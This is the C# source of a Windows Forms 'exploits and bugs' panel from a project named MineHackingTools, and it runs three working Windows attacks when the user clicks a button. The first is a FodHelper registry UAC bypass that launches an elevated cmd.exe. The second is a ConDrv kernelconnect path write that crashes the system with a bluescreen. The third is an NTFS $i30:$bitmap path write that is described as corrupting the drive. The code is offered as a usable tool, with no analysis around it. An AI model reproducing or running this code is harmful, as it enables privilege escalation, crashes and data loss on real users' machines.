using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MineHackingTools
{
    public partial class ExploitsAndBugsForm : Form
    {
        public ExploitsAndBugsForm()
        {
            InitializeComponent();
        }

        private void AddToListView(string Exploit, string Description)
        {
            ListViewItem ToColumns = new ListViewItem(Exploit);
            ToColumns.SubItems.Add(Description);
            listView1.Items.Add(ToColumns);
        }

        private void ExploitsAndBugsForm_Load(object sender, EventArgs e)
        {
            AddToListView("FodHelper.exe", "an exploit abusing FodHelper.exe auto elevation in windows to elevate to administrator.");
            AddToListView("ConDrv.sys", "an exploit allowed attackers to bluescreen you without even being administrator.");
            AddToListView("NTFS", "an exploit allowed attacers to corrupt your hard drive even if it was software or by accessing the path using a script that scammers might use in their website.");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            DialogResult dr = MessageBox.Show("are you sure you want to perform an exploit?", "Sure?", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
            if(dr == DialogResult.Yes)
            {
                foreach (ListViewItem GetNameFromList in listView1.SelectedItems)
                {
                    switch(GetNameFromList.Text)
                    {
                        case "FodHelper.exe":
                            if (Environment.Is64BitOperatingSystem == true)
                            {
                                RegistryKey FodHelper = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\Shell\Open\command");
                                FodHelper.SetValue(string.Empty, Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\System32\cmd.exe");
                                FodHelper.SetValue("DelegateExecute", string.Empty);
                                Process.Start("fodhelper.exe");
                                Task.Delay(1000).Wait();
                                FodHelper.SetValue(string.Empty, string.Empty);
                                FodHelper.DeleteValue("DelegateExecute");
                            }
                            else
                            {
                                MessageBox.Show("This Exploit Works only in 32-bit Operating Systems.", "Error", MessageBoxButtons.OKCancel, MessageBoxIcon.Error);
                            }
                            break;
                        case "ConDrv.sys":
                            try
                            {
                                File.WriteAllText(@"\\.\globalroot\device\condrv\kernelconnect" + @"\exploit.txt", "Exploiting.");
                            }
                            catch
                            {
                                MessageBox.Show("That exploit doesn't seem to work on your system.", "Error", MessageBoxButtons.OKCancel, MessageBoxIcon.Error);
                            }
                            break;
                        case "NTFS":
                            try
                            {
                                File.WriteAllText(@"C:\:$i30:$bitmap" + @"\hi.txt", "hi");
                            }
                            catch
                            {
                                continue;
                            }
                            break;
                        default:
                            MessageBox.Show("Please select an exploit to perform.", "Error", MessageBoxButtons.OKCancel, MessageBoxIcon.Error);
                            break;
                    }
                }
            }
        }
    }
}
